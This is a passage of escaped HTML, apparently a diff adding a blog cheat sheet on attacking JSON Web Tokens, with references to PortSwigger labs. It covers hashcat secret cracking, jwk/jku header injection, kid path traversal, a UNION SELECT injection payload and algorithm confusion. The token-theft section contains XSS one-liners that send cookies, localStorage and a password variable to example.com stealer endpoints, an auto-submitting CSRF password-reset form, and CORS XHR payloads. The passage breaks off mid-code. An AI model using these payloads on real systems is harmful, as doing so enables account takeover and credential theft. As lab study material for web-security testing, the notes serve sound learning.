+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat -a &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; -m &lt;span style=&#34;color:#ae81ff&#34;&gt;16500&lt;/span&gt; &amp;lt;YOUR-JWT&amp;gt; /path/to/jwt.secrets.list
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Change body in &lt;a href=&#34;https://jwt.io&#34;&gt;jwt.io&lt;/a&gt; and enter Key in Trailer field&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;24---jwt-authentication-bypass-via-jwk-header-injection&#34;&gt;2.4 - JWT authentication bypass via jwk header injection&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Generate RSA&lt;/li&gt;
+&lt;li&gt;Repeater -&amp;gt; JSON Web Token TAB -&amp;gt; Attack -&amp;gt; Embedded JWK&lt;/li&gt;
+&lt;li&gt;Notice &lt;em&gt;jwk&lt;/em&gt; added in header&lt;/li&gt;
+&lt;li&gt;Change body&lt;/li&gt;
+&lt;li&gt;Send request&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Instead of using the built-in attack in the JWT Editor extension, you can embed a JWK by adding a &lt;code&gt;jwk&lt;/code&gt; parameter to the header of the JWT manually. In this case, you need to also update the &lt;code&gt;kid&lt;/code&gt; header of the token to match the &lt;code&gt;kid&lt;/code&gt; of the embedded key.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;25---jwt-authentication-bypass-via-jku-header-injection&#34;&gt;2.5 - JWT authentication bypass via jku header injection&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Generate RSA&lt;/li&gt;
+&lt;li&gt;Copy PK as JWK&lt;/li&gt;
+&lt;li&gt;Create an endpoint of the PK:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;keys&amp;#34;&lt;/span&gt;: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;kty&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RSA&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AQAB&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;kid&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;75d0ef47-af89-47a9-9061-7c02a610d5ab&amp;#34;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;n&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Change &lt;em&gt;kid&lt;/em&gt; in you cookie with the generated one and &lt;strong&gt;Inject&lt;/strong&gt; &lt;em&gt;jku&lt;/em&gt; in the header the link to the endpoint containing our key :&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;alg&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RS256&amp;#34;&lt;/span&gt;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;jku&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://mysite.com/keys.json&amp;#34;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Sign it in Burp &lt;strong&gt;JSON Web Key&lt;/strong&gt; extention&lt;/li&gt;
+&lt;li&gt;Send request&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;26---jwt-authentication-bypass-via-kid-header&#34;&gt;2.6 - JWT authentication bypass via kid header&lt;/h3&gt;
+&lt;h4 id=&#34;261---path-traversal&#34;&gt;2.6.1 - Path Traversal&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;kid&lt;/code&gt; is an optional header claim which holds a key identifier, particularly useful when you have multiple keys to sign the tokens and you need to look up the right one to verify the signature.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;Generate Symetric Key with &lt;code&gt;key = null byte&lt;/code&gt; base64 encoded (AA==)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_19_231603.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Change &lt;em&gt;kid&lt;/em&gt; to &lt;code&gt;/dev/null&lt;/code&gt; which represent Null byte&lt;/li&gt;
+&lt;li&gt;Change Body&lt;/li&gt;
+&lt;li&gt;Sign with the generated Key&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_19_232035.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;262---sql-injection&#34;&gt;2.6.2 - SQL Injection&lt;/h4&gt;
+&lt;p&gt;In a scenario where the content of the &amp;ldquo;kid&amp;rdquo; is used to retreive the password from the database, you could change the payload inside the &amp;ldquo;kid&amp;rdquo; parameter to: &lt;code&gt;non-existent-index&#39; UNION SELECT &#39;ATTACKER&#39;;-- -&lt;/code&gt; and then sign the JWT with the secret key &lt;code&gt;ATTACKER&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;27---jwt-authentication-bypass-via-algorithm-confusion&#34;&gt;2.7 - JWT authentication bypass via algorithm confusion&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/&#34;&gt;https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Get &lt;strong&gt;Public Key&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Get &lt;strong&gt;Public Keys&lt;/strong&gt; from [[#JWKS common locations]]&lt;/li&gt;
+&lt;li&gt;or Crack it with &lt;code&gt;jwt_forgery.py&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;or use this :&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl s_client -connect example.com:443 2&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &amp;lt; /dev/null | sed -n &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/-----BEGIN/,/-----END/p&amp;#39;&lt;/span&gt; &amp;gt; certificatechain.pem 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl x509 -pubkey -in certificatechain.pem -noout &amp;gt; pubkey.pem
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Or we can use this&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 jwt_forgery&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;jwt1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;jwt2&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_20_003929.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To verify if the public key generated is right :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 jwt_tool&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;V &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;pk &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;jwt_key&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt; to verify &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; its right
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_20_005548.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Or you can verify by using the &lt;strong&gt;Tampered x509 JWT&lt;/strong&gt; and sending the request, if you get &lt;em&gt;200&lt;/em&gt; then it&amp;rsquo;s your account and it is the correct X.509 key.  Else repeat the Public key derivation Process.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Copy &lt;strong&gt;Public Key&lt;/strong&gt; with the blank line at the end !!
+&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_20_011040.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;PEM&lt;/strong&gt; to &lt;strong&gt;JWK&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Generate RSA key using the &lt;strong&gt;JWK&lt;/strong&gt; we got from &lt;strong&gt;PEM&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Generate New Symetric Key with &lt;strong&gt;base64 Encoded PEM&lt;/strong&gt; in &lt;em&gt;k&lt;/em&gt; value :&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_20_012443.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Change &lt;code&gt;alg&lt;/code&gt; parameter to &lt;code&gt;HS256&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Change body as you like&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Sign it using the symetric Key&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Send Request&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key&#34;&gt;JWT authentication bypass via algorithm confusion with no exposed key&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;iii---stealing-jwts&#34;&gt;III - Stealing JWTs&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;There&amp;rsquo;s no need to hack JWTs if you can &lt;strong&gt;steal&lt;/strong&gt; and replay them!&lt;/p&gt;
+&lt;p&gt;If you have other vulnerabilities in the application you may be able to steal or hijack the tokens of other users.&lt;/p&gt;
+&lt;h3 id=&#34;31---xss&#34;&gt;3.1 - XSS&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://example.com/cookiestealer.php?c=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;or&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Image&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://example.com/log.php?localStorage=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;(window[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localStorage&amp;#39;&lt;/span&gt;]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;or&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://example.com/?password=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;secretPasswordVariable&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;32---csrf&#34;&gt;3.2 - CSRF&lt;/h3&gt;
+&lt;p&gt;JWT tokens stored in cookies (whether they are HTTPOnly or not) will be automatically sent by the browser when an authenticated user interacts with the target site. When a victim triggers a CSRF payload the browser will send the associated cookies including the token. The attacker won&amp;rsquo;t be able to see these, but as they are being used to do the attacker&amp;rsquo;s bidding that doesn&amp;rsquo;t really matter.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;autosubmit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.example.com/account/passwordreset&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;enctype=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text/plain&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;victim1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BadGuyKnowsThis!&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Submit Request&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.getElementById(&amp;#34;autosubmit&amp;#34;).submit();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;33---cors-misconfiguration&#34;&gt;3.3 - CORS Misconfiguration&lt;/h3&gt;
+&lt;p&gt;When a site&amp;rsquo;s CORS policy allows arbitrary origins as well as sending credentials it is possible to craft an attack page containing an XHR request to the webserver, while also capturing the response.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;This leads to two possible attack paths:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;If the JWT is returned in any HTTP responses from the application, the token can be read by the attacker when the &amp;rsquo;trigger&amp;rsquo; request is sent. A good example of this is a JWT &amp;lsquo;refresh token&amp;rsquo; or queries to an account page or login page.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;If the JWT is sent in a cookie then CORS can be used as a type of CSRF to send the token without the attacker needing to see it.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Example - XHR CORS:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XMLHttpRequest&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.avictimwebsitewithJWTcookieauth.com/api/refreshtoken&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;withCredentials&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setRequestHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;application/json;charset=UTF-8&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Example - XHR CSRF:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XMLHttpRequest&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.avictimwebsitewithJWTcookieauth.com/api/passwordreset&amp;#34;&lt;/span&gt;);
